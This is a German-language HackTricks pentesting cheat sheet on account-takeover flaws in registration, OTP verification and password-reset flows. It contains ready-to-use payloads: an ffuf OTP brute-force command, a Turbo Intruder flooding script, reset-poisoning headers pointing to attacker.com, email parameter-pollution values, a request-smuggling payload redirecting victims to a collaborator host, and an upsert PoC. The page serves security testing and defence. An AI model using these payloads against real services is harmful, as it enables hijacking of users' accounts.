# Registrierung & Übernahme-Schwachstellen

{{#include ../banners/hacktricks-training.md}}

## Registrierungsübernahme

### Doppelte Registrierung

- Versuche, einen Account mit einem bereits existierenden username zu erstellen
- Prüfe das Variieren der email:
- Großschreibung
- +1@
- einen Punkt in die email einfügen
- Sonderzeichen im E-Mail-Namen (%00, %09, %20)
- Füge Leerzeichen nach der email ein: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Versuche email provider canonicalization tricks (dienstabhängig):
- Gmail ignoriert Punkte und subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` liefern an `victim@gmail.com`
- Einige Provider sind case-insensitive im local-part
- Einige Provider akzeptieren unicode confusables. Probiere Homoglyphs und soft hyphen `\u00AD` innerhalb des local-part
- Missbrauche diese, um: Einzigartigkeitsprüfungen zu umgehen, doppelte Accounts/workspace-Einladungen zu erhalten oder Victim-Anmeldungen zu blockieren (temporärer DoS), während du eine Übernahme vorbereitest

### Username Enumeration

Prüfe, ob du herausfinden kannst, wann ein username bereits in der Anwendung registriert wurde.

- Unterschiedliche Fehlermeldungen oder HTTP-Statuscodes
- Timing-Unterschiede (ein existierender Nutzer kann Lookup zu IdP/DB auslösen)
- Autofill des Registrierungsformulars mit Profildaten für bekannte E-Mails
- Prüfe Team/Invite-Flows: Eingabe einer E-Mail kann offenbaren, ob ein Account existiert

### Passwortrichtlinie

Beim Erstellen eines Users die Passwortrichtlinie prüfen (prüfe, ob schwache Passwörter zulässig sind).\
In diesem Fall kannst du versuchen, Credentials zu bruteforcen.

### SQL Injection

[**Siehe diese Seite** ](sql-injection/index.html#insert-statement)um zu lernen, wie man Account-Übernahmen versucht oder Informationen via **SQL Injections** in Registrierungsformularen extrahiert.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### E-Mail ändern

Nach der Registrierung versuche, die E-Mail zu ändern und prüfe, ob diese Änderung korrekt validiert wird oder ob sie zu beliebigen E-Mails geändert werden kann.

### Weitere Checks

- Prüfe, ob du **disposable emails** (mailinator, yopmail, 1secmail, etc.) verwenden kannst oder die Blockliste mit Subaddressing wie `victim+mailinator@gmail.com` umgehen kannst
- **Sehr lange** **Passwörter** (>200) führen zu **DoS**
- **Prüfe Rate-Limits bei der Account-Erstellung**
- Verwende username@**burp_collab**.net und analysiere den **callback**
- Wenn Telefonverifikation verwendet wird, prüfe phone parsing/injection Edge-Cases

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

## Schwache E-Mail/Telefon-Verifikation (OTP/Magic Link)

Registrierungsflows verifizieren Besitz häufig via numerischem OTP oder einem magic-link Token. Typische Fehler:

- Vorhersagbare oder kurze OTPs (4–6 Ziffern) ohne effektives Rate-Limiting oder IP/Device-Tracking. Versuche parallele Guesses und Header/IP-Rotation.
- OTP-Wiederverwendung über Aktionen oder Accounts hinweg, oder nicht an den spezifischen user/action gebunden (z. B. derselbe Code funktioniert für Login und Signup, oder funktioniert nach E-Mail-Änderung).
- Multi-value smuggling: einige Backends akzeptieren mehrere Codes und verifizieren, ob einer passt. Probiere:
- `code=000000&code=123456`
- JSON-Arrays: `{"code":["000000","123456"]}`
- Gemischte Parameter-Namen: `otp=000000&one_time_code=123456`
- Komma-/Pipe-separierte Werte: `code=000000,123456` oder `code=000000|123456`
- Response-Oracle: unterscheide falsche vs. abgelaufene vs. falscher-user Codes anhand Status/Meldung/Body-Länge.
- Tokens werden nach Erfolg oder nach Passwort-/E-Mail-Änderung nicht invalidiert.
- Verification-Token ist nicht an User-Agent/IP gebunden, sodass eine cross-origin Completion von attacker-kontrollierten Seiten möglich ist.

Bruteforcing Beispiel mit ffuf gegen einen JSON OTP-Endpunkt:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Parallel-/gleichzeitiges Raten, um sequenzielle Sperren zu umgehen (verwende Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder-Snippet, um 6‑stellige OTP‑Versuche zu fluten</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)

def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: submit the same valid OTP simultaneously in two sessions; sometimes one session becomes a verified attacker account while the victim flow also succeeds.
- Also test Host header poisoning on verification links (same as reset poisoning below) to leak or complete verification on attacker controlled host.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (bevor sich das Opfer registriert)

Eine leistungsstarke Klasse von Problemen tritt auf, wenn ein Angreifer Aktionen an der E‑Mail des Opfers durchführt, bevor dieses sein Konto erstellt, und später wieder Zugriff erlangt.

Wichtige Techniken zum Testen (an die Flows des Ziels anpassen):

- Classic–Federated Merge
  - Angreifer: registriert ein classic Konto mit der E‑Mail des Opfers und setzt ein password
  - Opfer: registriert sich später per SSO (gleiche E‑Mail)
  - Unsichere merges können beide Parteien eingeloggt lassen oder den Zugriff des Angreifers wiederherstellen
- Unexpired Session Identifier
  - Angreifer: erstellt ein Konto und hält eine langlebige Session (sich nicht ausloggen)
  - Opfer: stellt das password wieder her/legt es fest und benutzt das Konto
  - Teste, ob alte Sessions nach Reset oder Aktivierung von MFA gültig bleiben
- Trojan Identifier
  - Angreifer: fügt dem vorerstellten Konto einen sekundären Identifier hinzu (Telefon, zusätzliche E‑Mail, oder verknüpft das IdP des Angreifers)
  - Opfer: setzt das password zurück; Angreifer verwendet später den trojan identifier, um zurückzusetzen/einzuloggen
- Unexpired Email Change
  - Angreifer: initiiert einen email‑change zur Angreifer‑Mail und hält die Bestätigung zurück
  - Opfer: stellt das Konto wieder her und beginnt es zu nutzen
  - Angreifer: schließt später die ausstehende email‑Änderung ab, um das Konto zu stehlen
- Non‑Verifying IdP
  - Angreifer: nutzt ein IdP, das die E‑Mail‑Eigentümerschaft nicht verifiziert, um `victim@…` zu behaupten
  - Opfer: registriert sich über den klassischen Weg
  - Der Service merged auf Basis der E‑Mail, ohne `email_verified` zu prüfen oder lokale Verifikation durchzuführen

Praktische Tipps

- Harvest flows and endpoints from web/mobile bundles. Look for classic signup, SSO linking, email/phone change, and password reset endpoints.
- Erstelle realistische Automation, um Sessions am Leben zu halten, während du andere Flows testest.
- Für SSO‑Tests: stell einen Test OIDC provider auf und issue Tokens mit `email` claims für die Opfer‑Adresse und `email_verified=false`, um zu prüfen, ob das RP unverified IdPs vertraut.
- Nach jedem password reset oder email‑change verifiziere, dass:
  - alle anderen Sessions und Tokens invalidiert werden,
  - ausstehende email/phone change Möglichkeiten storniert werden,
  - zuvor verknüpfte IdPs/emails/phones erneut verifiziert werden.

Hinweis: Umfangreiche Methodologie und Fallstudien zu diesen Techniken sind in Microsoft’s pre‑hijacking research dokumentiert (siehe Referenzen am Ende).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Fordere einen password reset für deine E‑Mail‑Adresse an
2. Klicke auf den password reset Link
3. Ändere das password nicht
4. Klicke auf beliebige 3rd‑party Websites (z. B. Facebook, Twitter)
5. Fange die Anfrage im Burp Suite Proxy ab
6. Prüfe, ob der Referer‑Header den password reset token leak.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Fange die password reset Anfrage im Burp Suite ab
2. Füge in Burp Suite die folgenden Header hinzu oder bearbeite sie: `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Leite die Anfrage mit dem modifizierten Header weiter\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Suche nach einer password reset URL, die auf dem _host header_ basiert, z. B.: `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR bei API-Parametern <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Angreifer müssen sich mit ihrem Account einloggen und zur **Passwort ändern**-Funktion gehen.
2. Starte Burp Suite und fange die Anfrage ab
3. Sende sie an den Repeater-Tab und bearbeite die Parameter : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Schwaches Passwort-Reset-Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Das Passwort-Reset-Token sollte zufällig generiert und jedes Mal einzigartig sein.\
Versuche zu bestimmen, ob der Token abläuft oder immer derselbe ist; in manchen Fällen ist der Generierungsalgorithmus schwach und kann erraten werden. Folgende Variablen könnten vom Algorithmus verwendet werden.

- Zeitstempel
- UserID
- E-Mail des Benutzers
- Vor- und Nachname
- Geburtsdatum
- Kryptographie
- Nur Zahlen
- Kleine Token-Sequenz ( characters between \[A-Z,a-z,0-9])
- Token-Wiederverwendung
- Ablaufdatum des Tokens

### Leaking Password Reset Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Trigger a password reset request using the API/UI for a specific email e.g: test@mail.com
2. Inspect the server response and check for `resetToken`
3. Then use the token in an URL like `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Passwort-Reset durch Benutzernamen-Kollision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registriere dich im System mit einem Benutzernamen, der identisch mit dem des Opfers ist, aber mit eingefügten Leerzeichen vor und/oder nach dem Benutzernamen. z. B.: `"admin "`
2. Fordere ein Passwort-Reset für deinen bösartigen Benutzernamen an.
3. Verwende den an deine E-Mail gesendeten Token und setze das Passwort des Opfers zurück.
4. Melde dich mit dem neuen Passwort am Konto des Opfers an.

Die Plattform CTFd war für diesen Angriff verwundbar.\
Siehe: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account-Übernahme via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finde ein XSS in der Anwendung oder einer Subdomain, falls die Cookies auf die übergeordnete Domain beschränkt sind: `*.domain.com`
2. Leak das aktuelle **sessions cookie**
3. Authentifiziere dich als Benutzer mithilfe des Cookies

### Account-Übernahme via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Nutze **smuggler** um den Typ von HTTP Request Smuggling (CL, TE, CL.TE) zu erkennen\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Erstelle eine Anfrage, die das `POST / HTTP/1.1` mit den folgenden Daten überschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, die Opfer per Open Redirect zu burpcollab umzuleiten und ihre Cookies zu stehlen\
3. Die finale Anfrage könnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone-Berichte, die die Ausnutzung dieses Bugs zeigen\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Kontenübernahme via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstelle ein Payload für die CSRF, z. B.: “HTML form with auto submit for a password change”
2. Sende das Payload

### Kontenübernahme via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token könnte zur Authentifizierung eines Benutzers verwendet werden.

- Bearbeite das JWT mit einer anderen User ID / Email
- Prüfe auf schwache JWT-Signatur


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert bei vorhandener E-Mail)

Einige Signup-Handler führen ein upsert durch, wenn die angegebene Email bereits existiert. Akzeptiert der Endpoint einen minimalen Body mit Email und Passwort und erzwingt keine Eigentumsverifizierung, überschreibt das Senden der E-Mail des Opfers dessen Passwort pre-auth.

- Erkennung: Extrahiere Endpoint-Namen aus gebündeltem JS (oder mobilem App-Traffic), und fuzz dann Basis-Pfade wie /parents/application/v4/admin/FUZZ mit ffuf/dirsearch.
- Hinweise zur Methode: Ein GET, der Nachrichten wie "Only POST request is allowed." zurückliefert, deutet oft auf das richtige Verb hin und dass ein JSON-Body erwartet wird.
- Minimaler Body, in der Praxis beobachtet:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Beispiel PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Auswirkung: Full Account Takeover (ATO) ohne Reset-Token, OTP oder E-Mail-Verifizierung.

## Referenzen

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)

{{#include ../banners/hacktricks-training.md}}
